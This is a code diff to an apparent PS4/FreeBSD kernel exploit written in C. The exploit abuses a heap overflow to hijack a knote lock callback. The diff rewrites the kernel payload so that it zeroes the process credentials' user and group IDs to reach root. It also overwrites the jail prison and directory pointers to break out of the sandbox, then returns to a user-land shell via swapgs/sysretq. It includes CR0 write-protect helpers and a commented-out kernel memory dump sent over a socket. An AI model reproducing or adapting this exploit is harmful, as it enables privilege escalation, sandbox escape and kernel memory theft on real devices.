@@ -98,6 +98,8 @@ __typeof__(__isthreaded) *__isthreaded_address;
 #endif
 
 static int debug;
+static char *debugMessage;
+enum { DebugMessageSize = 0x1000 };
 
 void shell()
 {
@@ -109,73 +111,83 @@ void shell()
 	}
 }
 
+#define	OFFSETOF_CURTHREAD	0
+static __inline __pure2 struct thread *
+__curthread(void)
+{
+	struct thread *td;
+	__asm("movq %%gs:%1, %0;" : "=r"(td) : "m" (*(char *)OFFSETOF_CURTHREAD));
+	return (td);
+}
+
+static inline uint64_t cr0Get(void)
+{
+	uint64_t cr0;
+	__asm__ volatile("movq %%cr0, %0;" : "=r"(cr0) : : "memory");
+	return cr0;
+}
+
+static inline void cr0Set(uint64_t cr0)
+{
+	__asm__ volatile("movq %0, %%cr0;" : : "r"(cr0) : "memory");
+}
+
 void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
 {
-	char b[128];
-	struct thread *td[32];
-	struct sendto_args sargs;
-	struct write_args wargs;
+	struct thread *td;
+	struct ucred *cred;
 	int i;
 
+	td = __curthread();
+	SysSendto sys_sendto = (SysSendto)0xffffffff8249eba0;
+	SysWrite sys_write =  (SysWrite)0xffffffff8247b0f0;
+
+	struct sendto_args sargs;
+	struct write_args wargs;
+
  	sargs.s = debug;
-	sargs.buf = b;
-	sargs.len = 4;
+	sargs.buf = debugMessage;
+	sargs.len = DebugMessageSize;
  	sargs.flags = 0;
 	sargs.to = NULL;
 	sargs.tolen = 0;
 
 	wargs.fd = 1;
-	wargs.buf = b;
-	wargs.nbyte = 4;
+	wargs.buf = debugMessage;
+	wargs.nbyte = DebugMessageSize;
 
-	__asm__ volatile("mov %%gs:0, %0" : "=r"(td[0]));
-	__asm__ volatile("mov %%gs:1, %0" : "=r"(td[1]));
-	__asm__ volatile("mov %%gs:2, %0" : "=r"(td[2]));
-	__asm__ volatile("mov %%gs:3, %0" : "=r"(td[3]));
-	__asm__ volatile("mov %%gs:4, %0" : "=r"(td[4]));
-	__asm__ volatile("mov %%gs:5, %0" : "=r"(td[5]));
-	__asm__ volatile("mov %%gs:6, %0" : "=r"(td[6]));
-	__asm__ volatile("mov %%gs:7, %0" : "=r"(td[7]));
-	__asm__ volatile("mov %%gs:8, %0" : "=r"(td[8]));
-	__asm__ volatile("mov %%gs:9, %0" : "=r"(td[9]));
-	__asm__ volatile("mov %%gs:10, %0" : "=r"(td[10]));
-	__asm__ volatile("mov %%gs:11, %0" : "=r"(td[11]));
-	__asm__ volatile("mov %%gs:12, %0" : "=r"(td[12]));
-	__asm__ volatile("mov %%gs:13, %0" : "=r"(td[13]));
-	__asm__ volatile("mov %%gs:14, %0" : "=r"(td[14]));
-	__asm__ volatile("mov %%gs:15, %0" : "=r"(td[15]));
+//	cr0Set(cr0Get() & ~CR0_WP);
 
+	cred = NULL;
+	if(td->td_proc != NULL)
+		cred = td->td_proc->p_ucred;
 
-	__asm__ volatile("mov %%gs:16, %0" : "=r"(td[16]));
-	__asm__ volatile("mov %%gs:17, %0" : "=r"(td[17]));
-	__asm__ volatile("mov %%gs:18, %0" : "=r"(td[18]));
-	__asm__ volatile("mov %%gs:19, %0" : "=r"(td[19]));
-	__asm__ volatile("mov %%gs:20, %0" : "=r"(td[20]));
-	__asm__ volatile("mov %%gs:21, %0" : "=r"(td[21]));
-	__asm__ volatile("mov %%gs:22, %0" : "=r"(td[22]));
-	__asm__ volatile("mov %%gs:23, %0" : "=r"(td[23]));
-	__asm__ volatile("mov %%gs:24, %0" : "=r"(td[24]));
-	__asm__ volatile("mov %%gs:25, %0" : "=r"(td[25]));
-	__asm__ volatile("mov %%gs:26, %0" : "=r"(td[26]));
-	__asm__ volatile("mov %%gs:27, %0" : "=r"(td[27]));
-	__asm__ volatile("mov %%gs:28, %0" : "=r"(td[28]));
-	__asm__ volatile("mov %%gs:29, %0" : "=r"(td[29]));
-	__asm__ volatile("mov %%gs:30, %0" : "=r"(td[30]));
-	__asm__ volatile("mov %%gs:31, %0" : "=r"(td[31]));
-
-	while(1)
+	if(cred != NULL)
 	{
-		b[0] = '0';
-		b[2] = ' ';
-		b[3] = '\0';
-		for(i = 0; i < 32; ++i)
-		{
-			b[0] = '0' + (i / 10);
-			b[1] = '0' + i;
-			((SysWrite)0xffffffff8247b0f0)(td[i], &wargs);
-			((SysSendto)0xffffffff8249eba0)(td[i], &sargs);
-		}
+		cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
+		//cred->cr_groups[0] = 0;
+		// some prison fn
+		cred->cr_prison = (struct prison *)0xffffffff7cdc8db0;
 	}
+
+	// audit_canon_path
+	struct filedesc	*fdp = cred->td_proc->p_fd;
+	fdp->fd_cdir = fdp->fd_rdir = fdp->fd_jdir = 0xffffffff80a57992;
+
+//	cr0Set(cr0Get() | CR0_WP);
+
+	/*
+	for(i = 0; i < 0xeac180 + DebugMessageSize; i += DebugMessageSize)
+	{
+		memcpy(debugMessage, (int8_t *)0xffffffff80700000 + i, DebugMessageSize);
+		//sys_write(td, &wargs);
+		sys_sendto(td, &sargs);
+	}
+	*/
+
+
+
+	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
 }
 
 void dummy(void *arg) { }
@@ -278,14 +290,11 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 	knist.kl_lock = knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = run;
 	knist.kl_lockarg = NULL;
 
-	kote.kn_link.sle_next = NULL;
-	kote.kn_selnext.sle_next = NULL;
+	kote.kn_link.sle_next = kote.kn_selnext.sle_next = NULL;
 	kote.kn_knlist = &knist;
 	EV_SET(&kote.kn_kevent, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
 	kote.kn_sfflags = kote.kn_kevent.fflags;
 	kote.kn_sdata = kote.kn_kevent.data;
-	/*kote.kn_kevent.fflags = 0;
-	kote.kn_kevent.data = 0;*/
 
 	kist = (struct klist *)(map + bufferSize);
 	//for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
@@ -353,9 +362,15 @@ int main(int argc, char **argv)
 	__mb_sb_limit = *__mb_sb_limit_address;
 	sceKernelDlsym(libc, "_CurrentRuneLocale", (void **)&_CurrentRuneLocale_address);
 	_CurrentRuneLocale = *_CurrentRuneLocale_address;
+
+	// we wanna use these in the kernel, they must be resolved by then
+	ps4Resolve((void *)memcpy);
+	ps4Resolve((void *)sprintf);
 	#endif
 
 	debug = utilSingleAcceptServer(5088);
+	debugMessage = malloc(DebugMessageSize);
+	//memset(debugMessage, '?', DebugMessageSize);
 
 	kexecExploit(KExecIntermediateChuckCount, KExecIntermediateChunkSize, KExecBufferChunkSize, KExecOverflowChunkSize);
 
